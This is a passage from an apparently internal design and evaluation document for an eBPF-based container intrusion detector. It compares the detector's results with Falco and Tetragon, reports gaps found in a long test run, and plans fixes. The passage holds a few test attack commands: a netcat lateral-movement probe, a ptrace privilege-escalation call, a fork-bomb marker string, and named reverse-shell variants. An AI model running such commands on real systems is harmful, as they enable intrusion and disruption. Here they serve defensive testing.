| S6 | ptrace | `ctypes.CDLL(None).ptrace(0,0,0,0)` | PRIVESC (ptrace 101) |
| S7 | Cross-container lateral | `echo probe \| nc 172.22.0.7 9993` | cross_container via novel edge |
| S8 | Staged SSRF | 3 × novel TCP connections over 15s | Windowed accumulation → 3 edges → HIGH |

**Fork bomb safety:** S4 uses `echo ":(){ :|:& };: (marker only)"` — exercises rule engine without recursion. Real fork bomb tested in prior non-safe runs and confirmed FORK_ACCEL fires.

---

## 15. EVALUATION RESULTS

### 15.1 Detection Matrix (Real Tool Output, Production Testbed)

All results from real deployed tools on live containers, **not** simulators.

| Attack | Falco (stock) | Falco (tuned) | Tetragon (stock) | Tetragon (tuned) | CausalTrace |
|--------|:---:|:---:|:---:|:---:|:---:|
| S2a Bash rev-shell | DETECT | DETECT | miss | DETECT | DETECT |
| S2b Python dup2 | DETECT | DETECT | miss | DETECT | DETECT |
| S3 /etc/shadow | DETECT | DETECT | miss | DETECT | DETECT† |
| S4 Fork bomb | miss | DETECT | miss | miss | DETECT** |
| S5 unshare userns | miss | DETECT | miss | DETECT | DETECT |
| S6 ptrace | DETECT | DETECT | miss | DETECT | DETECT |
| S7 Cross-container | miss | DETECT | miss | DETECT | DETECT |
| S8 Staged SSRF | miss | DETECT | miss | DETECT | DETECT |
| **Total** | **4/8** | **8/8** | **0/8** | **7/8** | **8/8** |
| Custom rules required | 0 | 5 | 0 | 5 | **0** |
| Kernel enforcement | No | No | No | No | **Yes** |

† D19 fixed: `handle_file_open` (syscall 2, reads `rdi`) + `_classify_path()` if/else-if tree eliminates BPF verifier path explosion. Confirmed live: `[ALERT] SENSITIVE_FILE | flags=0x0004`.
\*\* Confirmed in prior full production run (`results/run_production/loader_window.log`: 21× FORK_ACCEL)

### 15.2 Recall by Attack Class

| Tool | Stateless (6 scenarios) | Compound (2 scenarios) |
|------|------------------------|------------------------|
| Falco (stock) | 4/6 = 0.67 | 0/2 = 0.00 |
| Falco (tuned) | 6/6 = 1.00 | 2/2 = 1.00 |
| Tetragon (stock) | 0/6 = 0.00 | 0/2 = 0.00 |
| Tetragon (tuned) | 5/6 = 0.83 | 2/2 = 1.00 |
| **CausalTrace** | **6/6 = 1.00** | **2/2 = 1.00** |

### 15.3 Key Differentiators (Not Captured by Detection Count)

| Capability | Falco (tuned) | Tetragon (tuned) | CausalTrace |
|------------|:---:|:---:|:---:|
| Custom rules required | 5 | 5 | **0** |
| Kernel-path enforcement (SIGKILL in μs) | No | No | **Yes** |
| Cross-container behavioral lineage | No | No | **Yes** |
| Temporal compound attack detection | No | No | **Yes** |
| Unknown attack detection (zero-day) | No | No | **Yes** |
| MITRE ATT&CK labelling | Partial | No | **Yes** |

### 15.4 Enforcement Latency

| Event | Latency |
|-------|---------|
| FD_REDIRECT (dup2 handler → SIGKILL) | <2 μs |
| FORK_ACCEL (fork handler → SIGKILL) | <2.5 μs |
| PRIVESC (kernel alert → Tier 3 enforce) | ~5–10 s |
| Novel edge (Tier 3 cycle → FIREWALL rule) | ~5 s |
| PATROL reference | ~23 μs |

*Table above describes the design-intent latencies. In the April 2026 deployed code, only the FD_REDIRECT and FORK_ACCEL rows are faithful; the rest are Tier-3-mediated at ~5 s because their handlers use `alert_only()` (see D24, L9). The revised v6 architecture (Section 17) restores sub-μs kill for all 8 scenarios via the SOCK_OPS session-kill path (D28).*

### 15.5 Marathon Evaluation — April 18, 2026 (604-cycle run)

The 8.5-hour production marathon was the first end-to-end evaluation with the full tier stack, 20-container testbed, and the safe-attack suite running at scheduled intervals. Its purpose was to generate the figures for the A\* submission. The run completed without a crash, but the figures revealed a second layer of structural gaps between the design and the deployed BCC code. Every gap is logged as a D24–D33 entry above. This subsection is the evidence trail.

#### 15.5.1 Raw Counts

| Artifact | Count |
|----------|-------|
| Tier 1 alerts (`loader.log`) | 1,116 |
| — `SENSITIVE_FILE` | 618 |
| — `PRIVESC` | 498 |
| — `REVERSE_SHELL` | 0 |
| — `FD_REDIRECT` | 0 |
| — `FORK_BOMB` / `FORK_ACCEL` | 0 |
| — `TWO_HOP` | 0 |
| — `NS_ESCAPE` | 0 |
| Tier 3 verdicts (`results_fast/verdicts.jsonl`) | 604 |
| — `CRITICAL` ("Data exfiltration via novel channel") | 598 |
| — `HIGH` | 5 |
| — `MEDIUM` | 1 |
| Scripted attacks attempted | 150 |
| Scenarios with no T1 alert | S2a, S2b, S4, S7, S8 (5 of 8 scenario classes) |
| Edges with CCA restriction maps | 2 of 13 |

#### 15.5.2 Figure-by-Figure Root Cause

| Figure | Observed | Root cause (see D-entry) |
|--------|----------|-------------------------|
| Fig 1 — Energy timeline | Flat-line at Rayleigh ≈18,469 after a warmup spike | D26 — cgroup-ID drift between calibration and marathon. The constant value is the ε=1e-6 whitening floor saturation, not an anomaly. |
| Fig 3 — PCA scatter | 11,960 points bucketed as CRITICAL; Normal/Low/Medium classes essentially empty | D26 — every cycle inherits the stuck Rayleigh and is classified CRITICAL by the severity rule in `sheaf_detector.py:332`. |
| Fig 4 — Edge energy heatmap | Only 4 of the expected ~39 cells populated (2 edges × 2 lags with data) | D25 — CCA k=50 rejected 11 of 13 edges; heatmap has no cells to fill for those edges. |
| Fig 5 — Latency CDF | CausalTrace T1 CDF has effectively zero samples; Falco-tuned (~30 ms) and Tetragon-tuned (~0.2 ms) dominate | D24 — most handlers emit `alert_only()` with no kill event to time. Only fork-bomb and dup2 produce the "sub-μs kill" originally claimed. |
| Fig 6 — FPR | 100 % "observation FPR" during clean traffic | D26 — same stuck Rayleigh fires every cycle. Reframed in the paper as "continuous monitoring" rather than enforcement FPR, which remains 0 %, but this reframing is a workaround, not a fix. |
| Fig 7 — Tier breakdown | T1 counts {618, 498, 0, 0, 0, 0, 0, 0} across the 8 scenarios | D24 + D27 — 5 of 8 handlers never kill, and the dup2-based reverse-shell handler never matches the bash/BusyBox variants used in the attack scripts. |
| Fig 8 — Runtime overhead | Similar-colored bars for calibration vs. enforce vs. Falco vs. Tetragon | Visualization fix only (Wong palette per phase). Data is valid; CausalTrace runtime cost compares favorably against Falco-tuned. |

#### 15.5.3 What the Marathon Does and Does Not Prove

**Does prove:**
- The operational skeleton holds up for 8.5 h without crashing (loader stable, ring-buffer pressure manageable, Docker listener reliable).
- The two handlers that are correctly wired (`handle_file` for `openat` → 618 alerts; `handle_privesc` for `unshare`/`ptrace` → 498 alerts) fire reliably under attack.
- CausalTrace's runtime overhead is lower than Falco-tuned on the same workload.

**Does not prove (contrary to prior paper claims):**
- Sub-μs kill on all 5 handler classes (only 2 are real — D24).
- Multi-container sheaf Laplacian detecting lateral movement (the runtime graph has 2 edges, not 13 — D25).
- Zero enforcement FPR under dense traffic (the question is ill-posed because no real kills occur against legitimate users — D28).
- Evasion resistance via Rényi entropy + bigram CMS (the marathon did not include evasion-variant injections — scheduled for the revised suite, D31).
- Better-than-Falco / better-than-Tetragon detection latency (T1 CDF has no samples for the non-firing handlers — D24).

The fix path is captured in D24–D33 and Section 17. The architecture is not wrong; the deployed code is a partial instantiation of it.

---

## 16. KNOWN ISSUES AND LIMITATIONS

| ID | Issue | Severity | Fix |
|----|-------|----------|-----|
| L1 | ~~`open()` syscall 2 not covered by `handle_file`~~ | ~~MEDIUM~~ | **FIXED (D19)** — `handle_file_open` added for syscall 2; `_classify_path()` eliminates verifier path explosion |
| L2 | IPv6 container connections invisible to Probe B | MEDIUM | Add `tcp_v6_connect` hook, extend `ip_to_cgroup` to 128-bit |
| L3 | Sheaf calibration requires ≥5 min normal traffic before attacks | LOW | Reduce by using online PCA during calibration |
| L4 | `bpf_sock_destroy` (L2 SEVER) not yet wired | LOW | Requires `BPF_PROG_TYPE_SK_SKB` program type |
| L5 | Fork bomb tested with cmdline marker only | LOW | Real d2 test confirmed in prior runs |
| L6 | Bigram CMS collision overhead: ~5% overcount at high rates | INFO | Increase CMS_COLS to 256 to reduce |
| L7 | Docker event listener has 500ms startup delay | INFO | `time.sleep(0.5)` on container start events; intentional |
| L8 | Single-host only (no distributed sheaf) | SCOPE | Multi-node requires inter-host correlation protocol |
| L9 | Only 2 of 5 T1 handlers actually kill in `causaltrace_bcc.c` (`alert_only()` is a no-op for execve, file, privesc, two-hop) | **HIGH** | D24 — wire all handlers to a compound kill gate; session-RST via SOCK_OPS (D28) |
| L10 | Calibration produces restriction maps for 2 of 13 observed edges (CCA k=50 demands ≥60 aligned windows) | **HIGH** | D25 — reduce k to 15 + synthetic inter-container traffic driver during calibration |
| L11 | Cgroup IDs drift between calibration and evaluation (`docker compose down && up` rekeys all cgroups) → Rayleigh stuck at ε-floor saturation | **HIGH** | D26 — cgroup snapshot pre-flight + restriction maps keyed by container name, not cgroup ID |
| L12 | Reverse-shell handler misses bash `/dev/tcp/` and BusyBox `nc -e` (neither uses `dup2()`) | **HIGH** | D27 — fd-table inspection in `handle_execve` for any shell binary |
| L13 | Enforcement kills the container process, not the attacker session → disconnects legitimate users | **HIGH** | D28 — SOCK_OPS TCP RST targeted by `connection_context[sock]` |
| L14 | No IP-level attacker/user differentiation → every alert treated as attacker-origin | **HIGH** | D29 — `client_trust` + `connection_context` BPF maps, populated during calibration, consumed by enforcement gate |
| L15 | Threshold τ_global static — stale after hours of drift; any naive EMA replacement is self-masking during attacks | MEDIUM | D30 — guarded EMA with 30 s pristine-window freeze and α=0.02 |
| L16 | Attack suite has 8 scenarios, no genuine zero-day-style chains beyond S7/S8 | MEDIUM | D31 — expand to 10 types × 15 injections (S8 Log4Shell, S9 SSRF→RCE, S10 escape) |
| L17 | No pre-flight disk/swap/BPF-conflict gates; no log rotation; no detector watchdog | MEDIUM | D32 — preflight script + supervisor with 15 s heartbeat timeout |
| L18 | No shakedown criterion before long marathon — every launch is "hope it works for 8 hours" | MEDIUM | D33 — mandatory 7-min mini-run with 7 pass criteria, gated before full runs |

---

## 17. POST-MARATHON REVISION

**Scope:** Architecture v6 — the revision in progress as of April 18, 2026, addressing the L9–L18 issues surfaced by the marathon. Sections below summarize the revised behavior; mechanical detail lives in the individual D24–D33 entries.

### 17.1 What Changes, What Stays

**Unchanged from v5:**
- Three-tier structure (Tier 1 kernel invariants, Tier 2 kprobes + tracepoints, Tier 3 sheaf daemon).
- d=74 signal vector (3 Rényi + 50 PCA + 20 marginals + 1 rate).
- Bigram CMS with noise filter + cold-path tail-call semantics.
- Multi-lag CCA (ℓ ∈ {0, 1, 2}), Mahalanobis edge energy, global Rayleigh quotient.
- 8-bit behavior vector with per-bit timestamps + lazy expiry.
- Graduated enforcement engine (L0 OBSERVE … L8 KILL).

**Revised in v6:**
| Area | v5 → v6 |
|------|---------|
| Enforcement target | Container process (`bpf_send_signal`) → Attacker TCP session (SOCK_OPS RST) — D28 |
| Handler kill path | 2 of 5 real → 8 of 10 real, gated on two-hop ∨ IP-untrusted — D24 |
| Reverse-shell invariant | `dup2(sockfd, 0/1/2)` only → fd-table inspection at execve + dup2 — D27 |
| User/attacker distinction | None → `client_trust` + `connection_context` BPF maps — D29 |
| CCA `n_components` | 50 → 15 (sample floor 60 → ~25) — D25 |
| Calibration traffic | Organic only → synthetic inter-container RPC driver during 30-min window — D25 |
| Cgroup stability | Unmonitored drift → snapshot at calibration start + abort on mid-run restart — D26 |
| Threshold adaptation | Static τ from calibration → guarded EMA with 30 s pristine freeze, α=0.02 — D30 |
| Attack suite | 8 scenarios, ~15 injections total | 10 categories × 15 = 150 injections, 3 chain attacks (S8/S9/S10) — D31 |
| Operational safety | None | Preflight gates + watchdog + log rotation + BPF pinning — D32 |
| Shakedown | None | Mandatory 7-min mini-run with 7 pass criteria — D33 |

### 17.2 Revised Detection-to-Enforcement Chain

```
syscall enters the kernel
  ↓
Tier 1 dispatcher (unchanged from v5 — D5 cold-path, D6 noise filter, bigram CMS)
  ↓
Handler fires for known class (execve / file / fork / dup2 / privesc)
  ↓
Compound gate evaluation (NEW in v6):
  1. Behavior bit set in container_behavior[cg]
  2. connection_context[current_sock] → client_ip, trust_level
  3. If trust_level == TRUSTED: alert only, no enforcement
  4. If two-hop pattern matched (BIT_SHELL_SPAWN ∧ BIT_LATERAL_CONNECT within 5s)
     OR trust_level == UNKNOWN:
        → issue SOCK_OPS TCP RST on the attacker's sock
        → mark client_trust[client_ip] = BLOCKED (persistent across sessions)
  5. For fd-redirect / fork-bomb invariants with no traceable session:
        → fall back to bpf_send_signal(9) against the current process (legacy path)
  ↓
Tier 3 daemon reads alerts_rb / telemetry_rb every 5s
  ↓
Sheaf detector applies guarded EMA threshold update (D30)
  ↓
Novel-edge sliding window accumulator (unchanged D14)
  ↓
Eigenmode-based semantic labelling (unchanged)
  ↓
Enforcement engine escalates: DENY → THROTTLE → FIREWALL → QUARANTINE with TTL
```

### 17.3 Implementation Sequence

Ordered by dependency. Each step is independently testable via the mini-run (D33):

1. **BCC handler wiring (D24):** Replace `alert_only()` on execve, file, privesc, and two-hop with `maybe_kill()` — a new function that calls `immediate_kill()` only when the compound gate (D29) returns true. Preserves the "no kill on benign setns" property from D16.
2. **IP trust maps (D29):** Add `client_trust`, `connection_context`, `task_to_sock`. Attach `kretprobe/inet_csk_accept` to populate them. Attach `kprobe/tcp_close` to drain them.
3. **SOCK_OPS session kill (D28):** Attach `BPF_PROG_TYPE_SOCK_OPS` to the root cgroup. Expose `session_kill(sock)` helper that transitions sock to `TCP_CLOSE` via RST.
4. **Execve fd-table reverse-shell inspection (D27):** Extend `handle_execve` with the unrolled fd 0/1/2 socket-inode check. Guard with `#pragma unroll` and bounds-check every kernel pointer deref.
5. **Guarded EMA threshold (D30):** Add `pristine_streak` counter to `SheafDetector`. Gate `self.global_threshold` updates on `pristine_streak ≥ 6`.
6. **Calibration refactor (D25, D26):** Lower CCA k to 15. Add synthetic traffic driver (`scripts/calibration_driver.py`). Write `cgroup_snapshot.json`. Change restriction-map keys to container names.
7. **Attack chain scripts (D31):** Add `attacks/scenario_8_log4shell.sh`, `scenario_9_ssrf_rce.sh`, `scenario_10_container_escape.sh`. Add the evasion-variant randomizer to `attacks/run_all.sh`.
8. **Stability layer (D32):** `scripts/preflight.sh`, `scripts/supervisor.py`, log rotation config, BPF pinning paths.
9. **Mini-run gate (D33):** `scripts/minirun.sh` with the 7 pass criteria. Full-marathon launcher refuses to start unless the mini-run passed within the last 30 minutes.
10. **Figure regeneration:** Once marathon passes, rerun `generate_astar_plots.py` on the new verdicts/signals. The fixes to Fig 3/4/5/6/7 should resolve themselves because the underlying data is now meaningful.

### 17.4 Success Criteria for v6

The revision is considered complete when a single 8-hour marathon run on the unchanged v6 testbed produces:

1. **Detection recall ≥ 0.95** on the 10-category × 15-injection suite (≥142 of 150 attacks generate at least one T1 or T3 alert).
2. **At least 10 edges** with populated restriction maps in `calibration/restriction_maps.npz` (evidence of D25 working).
3. **Rayleigh quotient distribution** — median during pristine windows within ±20 % of calibration mean (evidence of D26 + D30 working together; no ε-floor saturation).
4. **Session-kill count > 0**, container-kill count = 0 against client IPs marked `TRUSTED` (evidence of D28 + D29).
5. **Enforcement latency** — p95 of (syscall → RST-on-wire) < 5 μs on the 6 stateless scenarios.
6. **Detector heartbeat** never stale > 15 s across the full run (D32 watchdog).
7. **Disk growth** under 2 GB total across `loader.log`, `verdicts.jsonl`, `signals.jsonl` combined (D32 rotation).

Any single failure → revision is not complete. The paper is not submitted against the v5 marathon results; it waits for v6.

---

*End of CausalTrace Definitive Architecture vFinal.2 — April 18, 2026 (post-marathon revision)*
